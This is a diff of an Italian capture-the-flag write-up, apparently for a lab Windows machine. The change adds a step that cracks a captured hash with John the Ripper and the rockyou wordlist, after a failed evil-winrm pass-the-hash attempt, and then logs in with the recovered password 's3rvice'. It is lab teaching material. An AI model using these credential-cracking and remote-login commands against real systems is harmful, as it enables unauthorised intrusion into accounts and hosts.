@@ -28,7 +28,15 @@ Benissimo, ottenuto l'hash finalmente posso mettere in pratica una tecnica che h
 evil-winrm -u svc-alfresco -H "6a2929599dd19458e2c15587a7c870e5$d7a17216a7094b7ddece4533f3255c63b0906bfde35e2bdb75c40bff8f791a2a0d80d905e8d306a5d1e1060a9cb7c44f652caf14c7e74138259ddda20a9a1040a236d708f183cae602c195261bf614a381d822b11ecf3870becd7a1b4f7c9db4339023bf7aa7d5e7ddf00836385f075f52a814e63df0826a4b6937d3789bafa0c2c9735bbd9378b50125db20fad4a884b4e7f298cb5a8e244fa31b4c379a9131f4977ff4bd5a270e3d6e52e3ae32bdd550312cdba3ea40891033b330791bc3415a709fcd592165b3e4a6b0150a58f1ffe962a9a2783d4b973c99c118cae4535030169f2c8f63" -i 10.10.10.161
 ```
 
-Come non detto, quella tecnica non funziona, entro con la password:
+Come non detto, quella tecnica non funziona.
+
+Rompo l'hash banalmente con John:
+
+```
+john --wordlist=rockyou.txt hash.txt
+```
+
+Ed entro con la password:
 
 ```
 evil-winrm -u svc-alfresco -p s3rvice -i 10.10.10.161
